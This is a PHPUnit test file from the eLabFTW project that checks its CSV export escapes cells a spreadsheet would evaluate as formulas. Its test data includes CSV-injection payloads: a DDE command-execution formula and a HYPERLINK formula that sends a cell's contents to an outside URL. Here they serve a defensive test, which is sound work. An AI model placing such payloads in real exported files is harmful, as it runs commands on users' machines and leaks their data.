<?php

declare(strict_types=1);

/**
 * @author Nicolas CARPi <nico-git@deltablot.email>
 * @copyright 2026 Nicolas CARPi
 * @see https://www.elabftw.net Official website
 * @license AGPL-3.0
 * @package elabftw
 */

namespace Elabftw\Make;

use Codeception\Attribute\DataProvider;
use PHPUnit\Framework\TestCase;
use Stringable;

/**
 * Cells that a spreadsheet application would evaluate as a formula must be neutralized (CSV injection)
 */
class AbstractMakeCsvTest extends TestCase
{
    #[DataProvider('cellsProvider')]
    public function testEscapeFormulas(mixed $cell, mixed $expected): void
    {
        $this->assertSame(array($expected), AbstractMakeCsv::escapeFormulas(array($cell)));
    }

    /** @return array<string, array{mixed, mixed}> */
    public static function cellsProvider(): array
    {
        $stringable = new class implements Stringable {
            public function __toString(): string
            {
                return '=1+1';
            }
        };
        return array(
            // anything a spreadsheet would evaluate gets a leading single quote so it is displayed as text
            'equals' => array('=1+1', "'=1+1"),
            'plus' => array('+1+1', "'+1+1"),
            'minus' => array('-1+1', "'-1+1"),
            'at' => array('@SUM(1,1)', "'@SUM(1,1)"),
            'tab' => array("\t=1+1", "'\t=1+1"),
            'carriage return' => array("\r=1+1", "'\r=1+1"),
            'dde' => array('=cmd|" /C calc"!A0', '\'=cmd|" /C calc"!A0'),
            'hyperlink' => array('=HYPERLINK("https://example.com/?leak="&A1,"click")', '\'=HYPERLINK("https://example.com/?leak="&A1,"click")'),
            'markdown list' => array("- step one\n- step two", "'- step one\n- step two"),
            'stringable' => array($stringable, "'=1+1"),
            // a number cannot be a formula and must remain a number
            'negative number' => array('-20', '-20'),
            'negative decimal' => array('-5.50', '-5.50'),
            'positive exponent' => array('+1e3', '+1e3'),
            'int' => array(-20, -20),
            'float' => array(-5.5, -5.5),
            // everything else is left untouched
            'null' => array(null, null),
            'empty string' => array('', ''),
            'plain text' => array('Western blot', 'Western blot'),
            'formula not at start' => array('a=1+1', 'a=1+1'),
            'apostrophe' => array("'s-Hertogenbosch", "'s-Hertogenbosch"),
        );
    }
}
